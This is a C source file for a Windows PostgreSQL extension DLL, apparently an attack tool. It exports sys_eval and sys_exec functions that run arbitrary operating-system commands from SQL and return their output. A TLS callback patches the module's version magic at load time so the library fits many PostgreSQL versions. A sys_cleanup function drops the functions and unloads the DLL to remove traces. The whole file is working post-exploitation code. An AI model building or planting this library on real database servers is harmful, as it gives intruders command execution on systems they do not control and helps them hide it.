#include "postgres.h"
#include "fmgr.h"
#include <windows.h>
#include <winver.h>
#include "utils/geo_decls.h"

Pg_magic_struct Pg_magic_data = {
	sizeof(Pg_magic_struct),
	0,
	FUNC_MAX_ARGS,
	INDEX_MAX_KEYS,
	NAMEDATALEN,
	FLOAT4PASSBYVAL,
	FLOAT8PASSBYVAL
};//PG_MODULE_MAGIC_DATA;

extern PGDLLEXPORT const Pg_magic_struct *PG_MAGIC_FUNCTION_NAME(void);
const Pg_magic_struct * PG_MAGIC_FUNCTION_NAME(void) \
{
	//static const Pg_magic_struct Pg_magic_data = PG_MODULE_MAGIC_DATA;
	return &Pg_magic_data;
}
extern int no_such_variable;

#if defined(_WIN32)
	#define DLLEXPORT __declspec(dllexport) 
#else
	#define DLLEXPORT
#endif

#define WIN32_LEAN_AND_MEAN
#define NOCOMM

// _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

void NTAPI TlsCallBack(PVOID h, DWORD dwReason, PVOID pv);

#ifdef _M_AMD64
	#pragma comment (linker, "/INCLUDE:_tls_used")
	#pragma comment (linker, "/INCLUDE:p_tls_callback1")
	#pragma const_seg(push)
	#pragma const_seg(".CRT$XLAAA")
	EXTERN_C const PIMAGE_TLS_CALLBACK p_tls_callback1 = TlsCallBack;
	//#pragma const_seg(".CRT$XLAAB")
	//EXTERN_C const PIMAGE_TLS_CALLBACK p_tls_callback2 = tls_callback2;
	#pragma const_seg(pop)
#endif

#ifdef _M_IX86
	#pragma comment (linker, "/INCLUDE:__tls_used")
	#pragma comment (linker, "/INCLUDE:_p_tls_callback1")
	#pragma data_seg(push)
	#pragma data_seg(".CRT$XLAAA")
	EXTERN_C PIMAGE_TLS_CALLBACK p_tls_callback1 = TlsCallBack;
	//#pragma data_seg(".CRT$XLAAB")
	//EXTERN_C PIMAGE_TLS_CALLBACK p_tls_callback2 = tls_callback2;
	#pragma data_seg(pop)
#endif

HANDLE hLibModule = NULL;

void NTAPI TlsCallBack(PVOID hModule, DWORD dwReason, PVOID pv)
{
	elog(NOTICE, "TlsCallBack: dwReason: %d", dwReason);

	if (dwReason != DLL_PROCESS_ATTACH) {
		elog(NOTICE, "TlsCallBack: dwReason != DLL_PROCESS_ATTACH");
		return;
	}

	char ModulePath[MAX_PATH] = { 0 };
	WORD* data = NULL;
	char* version = NULL;
	int major = 0, minor = 0;

	hLibModule = hModule;

	HANDLE hPostgres = GetModuleHandleA((LPCSTR)"postgres.exe");
	GetModuleFileNameA(hPostgres, ModulePath, MAX_PATH);

	DWORD  verHandle = 0;
	UINT   size = 0;
	LPBYTE lpBuffer = NULL;
	DWORD  verSize = GetFileVersionInfoSize(ModulePath, &verHandle);

	if (verSize == NULL) {
		elog(NOTICE, "[!] GetFileVersionInfoSize failed!\n");
		return;
	}

	LPSTR verData = malloc(verSize);
	if (!GetFileVersionInfo(ModulePath, verHandle, verSize, verData))
	{
		elog(NOTICE, "[!] GetFileVersionInfo failed!\n");
		return;
	}

	if (VerQueryValue(verData, "\\", (VOID FAR* FAR*)&lpBuffer, &size))
	{
		if (size)
		{
			VS_FIXEDFILEINFO *verInfo = (VS_FIXEDFILEINFO *)lpBuffer;
			if (verInfo->dwSignature == 0xfeef04bd)
			{
				// Doesn't matter if you are on 32 bit or 64 bit,
				// DWORD is always 32 bits, so first two revision numbers
				// come from dwFileVersionMS, last two come from dwFileVersionLS
				elog(NOTICE, "File Version: %d.%d.%d.%d\n",
					(verInfo->dwFileVersionMS >> 16) & 0xffff,
					(verInfo->dwFileVersionMS >> 0) & 0xffff,
					(verInfo->dwFileVersionLS >> 16) & 0xffff,
					(verInfo->dwFileVersionLS >> 0) & 0xffff
				);

				// PG_MODULE_MAGIC_DATA Patching. Here the magic happens ;-)
				int* dMagic = (int *)&Pg_magic_data;
				elog(NOTICE, "[Entry] PG_MAGIC_FUNCTION_NAME: %d\n", dMagic[1]);
				unsigned int pgMajor = (verInfo->dwFileVersionMS >> 16) & 0xffff;
				unsigned int pgMinor = (verInfo->dwFileVersionMS >> 0) & 0xffff;

				// EnterpriseDB builds for Windows set FLOAT8PASSBYVAL to false even on 64 bit architectures.
				// It changed on 9.5+ builds. This small hack is required to keep wide range compatibility on 9.x family
				// Reference: https://lists.osgeo.org/pipermail/postgis-users/2018-May/042757.html
				if ((pgMajor == 9 && pgMinor <= 4) || (pgMajor < 9)) {
					elog(NOTICE, "Version <9.5 detected. Patching FLOAT8PASSBYVAL to false");
					Pg_magic_data.float8byval = false;
				}
				dMagic[1] = (pgMajor * 100 + pgMinor);
				elog(NOTICE, "[Fixed] PG_MAGIC_FUNCTION_NAME: %d\n", dMagic[1]);
			}
		}
	}
	free(verData);
	return;
}

/*
 Reference: https://github.com/postgres/postgres/blob/master/src/backend/utils/adt/varlena.c
 */

char *quoted_string(const char * cstr) {
	char	*quoted_string;
	size_t	cstr_len = strlen(cstr);

	quoted_string = malloc(cstr_len + 2 + 1);
	if (quoted_string == NULL)
	{
		errno = ENOMEM;
		return NULL;
	}

	quoted_string[0] = '"';
	memcpy(&quoted_string[1], cstr, cstr_len);
	quoted_string[++cstr_len] = '"';
	quoted_string[++cstr_len] = '\0';

	return  quoted_string;
}

FILE *compat_popen(const char *cmd, const char *type)
{
	char	*quoted_cmd;
	int		save_errno;
	FILE	*resproc;

	quoted_cmd = quoted_string(cmd);
	if (quoted_cmd == NULL) {
		return NULL;
	}
	resproc  = _popen(quoted_cmd, type);

	save_errno = errno;
	free(quoted_cmd);
	errno = save_errno;

	return resproc;
}

int compat_system(const char *cmd)
{
	char	*quoted_cmd;
	int		save_errno;
	int		rescode;
	quoted_cmd = quoted_string(cmd);
	if (quoted_cmd == NULL) {
		return -1;
	}

#undef system
	rescode = system(quoted_cmd);

	save_errno = errno;
	free(quoted_cmd);
	errno = save_errno;

	return rescode;
}



PGDLLEXPORT Datum sys_eval(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(sys_eval);
Datum sys_eval(PG_FUNCTION_ARGS) {
	text *argv0 = PG_GETARG_TEXT_P(0);
	text *result_text;
	char *command;
	char *result;
	FILE *pipe;
	char *line;
	int32 outlen, linelen;

	command = (char *)text_to_cstring(argv0);

	elog(NOTICE, "[sys_eval] Command: %s", command);

	line = (char *)malloc(1024);
	result = (char *)malloc(1);
	outlen = 0;

	result[0] = '\0';

	pipe = compat_popen(command, "r");

	while (fgets(line, sizeof(line), pipe) != NULL) {
		linelen = strlen(line);
		result = (char *)realloc(result, outlen + linelen);
		strncpy(result + outlen, line, linelen);
		outlen = outlen + linelen;
	}

	pclose(pipe);
	pfree(command);

	if (*result) {
		result[outlen - 1] = 0x00;
	}

	result_text = (text *)cstring_to_text(result);

	PG_FREE_IF_COPY(argv0, 0);
	PG_RETURN_POINTER(result_text);
}


PGDLLEXPORT Datum sys_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(sys_exec);
Datum sys_exec(PG_FUNCTION_ARGS) {
	text *argv0 = PG_GETARG_TEXT_P(0);
	int32 result = 0;
	char *command;

	command = (char *)text_to_cstring(argv0);

	elog(NOTICE, "[sys_exec] Command: %s", command);

	result = compat_system(command);

	pfree(command);

	PG_FREE_IF_COPY(argv0, 0);
	PG_RETURN_INT32(result);
}


DWORD WINAPI CleanUp(LPVOID lpParam);

/*
SPI Constants
Source: https://docs.huihoo.com/doxygen/postgresql/spi_8h_source.html#l00044
*/
#define SPI_ERROR_CONNECT       (-1)
#define SPI_ERROR_COPY          (-2)
#define SPI_ERROR_OPUNKNOWN     (-3)
#define SPI_ERROR_UNCONNECTED   (-4)
#define SPI_ERROR_CURSOR        (-5)    /* not used anymore */
#define SPI_ERROR_ARGUMENT      (-6)
#define SPI_ERROR_PARAM         (-7)
#define SPI_ERROR_TRANSACTION   (-8)
#define SPI_ERROR_NOATTRIBUTE   (-9)
#define SPI_ERROR_NOOUTFUNC     (-10)
#define SPI_ERROR_TYPUNKNOWN    (-11)

#define SPI_OK_CONNECT          1
#define SPI_OK_FINISH           2
#define SPI_OK_FETCH            3
#define SPI_OK_UTILITY          4
#define SPI_OK_SELECT           5
#define SPI_OK_SELINTO          6
#define SPI_OK_INSERT           7
#define SPI_OK_DELETE           8
#define SPI_OK_UPDATE           9
#define SPI_OK_CURSOR           10
#define SPI_OK_INSERT_RETURNING 11
#define SPI_OK_DELETE_RETURNING 12
#define SPI_OK_UPDATE_RETURNING 13
#define SPI_OK_REWRITTEN        14

PGDLLEXPORT Datum sys_cleanup(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(sys_cleanup);
Datum sys_cleanup(PG_FUNCTION_ARGS) {
	int result;
	result = 0;

	// Reference: https://www.postgresql.org/docs/9.0/spi-examples.html
	if (SPI_connect() == SPI_OK_CONNECT) {
		int ret;
		elog(NOTICE, "[sys_cleanup] Going to DROP sys_eval");
		ret = SPI_exec((LPCSTR)"drop function sys_eval(text)", 0);
		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);

		elog(NOTICE, "[sys_cleanup] Going to DROP sys_exec");
		ret = SPI_exec((LPCSTR)"drop function sys_exec(text)", 0);
		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);

		elog(NOTICE, "[sys_cleanup] Going to DROP sys_cleanup");
		ret = SPI_exec((LPCSTR)"drop function sys_cleanup()", 0);
		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);
		SPI_finish();
		result = 1;
	}

	elog(NOTICE, "Create Clenup Thread");
	CreateThread(
		NULL,			// default security attributes
		0,				// use default stack size  
		CleanUp,		// thread function name
		NULL,			// argument to thread function 
		0,				// use default creation flags 
		NULL);			// returns the thread identifier 

	PG_RETURN_INT32(result);
}

DWORD WINAPI CleanUp(LPVOID lpParam)
{
	elog(NOTICE, "[CleanUp] Thread Start and sleep");
	Sleep(1000);
	elog(NOTICE, "[CleanUp] About to call FreeLibraryAndExitThread");
	FreeLibraryAndExitThread(hLibModule, 0x0);
	return 0;
}